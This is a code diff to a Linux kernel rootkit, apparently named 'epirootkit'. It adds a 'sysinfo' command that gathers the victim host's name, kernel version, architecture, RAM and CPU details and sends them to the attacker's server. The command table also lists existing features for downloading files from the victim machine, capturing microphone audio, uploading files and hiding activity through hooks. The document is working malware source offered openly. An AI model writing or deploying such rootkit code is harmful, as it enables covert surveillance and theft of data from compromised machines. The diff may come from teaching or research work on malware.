@@ -6,6 +6,9 @@
 #include <linux/slab.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
+#include <linux/sched.h>
+#include <linux/mm.h>
+#include <linux/utsname.h>
 
 #include "crypto.h"
 #include "epirootkit.h"
@@ -36,6 +39,7 @@ static int start_microphone_handler(char *args);
 static int play_audio_handler(char *args);
 static int get_file_handler(char *args);
 static int upload_handler(char *args);
+static int sysinfo_handler(char *args);
 
 static struct command rootkit_commands_array[] = {
     { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 50, connect_handler },
@@ -58,6 +62,7 @@ static struct command rootkit_commands_array[] = {
     { "hooks", 5, "manage hide/forbid/alter rules", 30, hooks_menu_handler },
     { "get_file", 8, "download a file from victim machine", 35, get_file_handler },
     { "upload", 6, "receive a file and save it on disk", 40, upload_handler },
+    { "sysinfo", 7, "get system information in JSON format", 40, sysinfo_handler },
     { NULL, 0, NULL, 0, NULL }
 };
 
@@ -477,4 +482,40 @@ static int play_audio_handler(char *args) {
     DBG_MSG("play_audio_handler: audio played successfully\n");
     send_to_server("Audio played\n");
     return SUCCESS;
+}
+
+static int sysinfo_handler(char *args) {
+    struct new_utsname *uts = utsname();
+    char *info = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
+    if (!info)
+        return -ENOMEM;
+
+    unsigned long ram_mb = (totalram_pages() << PAGE_SHIFT) / 1024 / 1024;
+    int cpu_count = num_online_cpus();
+    const char *cpu_model = boot_cpu_data.x86_model_id[0] ? boot_cpu_data.x86_model_id : "Unknown";
+
+    snprintf(info, STD_BUFFER_SIZE,
+        "{\n"
+        "  \"hostname\": \"%s\",\n"
+        "  \"system\": \"%s\",\n"
+        "  \"release\": \"%s\",\n"
+        "  \"version\": \"%s\",\n"
+        "  \"architecture\": \"%s\",\n"
+        "  \"ram_mb\": \"%lu\",\n"
+        "  \"cpu_model\": \"%s\",\n"
+        "  \"cpu_cores\": \"%d\",\n"
+        "}\n",
+        uts->nodename,
+        uts->sysname,
+        uts->release,
+        uts->version,
+        uts->machine,
+        ram_mb,
+        cpu_model,
+        cpu_count
+    );
+
+    send_to_server(info);
+    kfree(info);
+    return 0;
 }
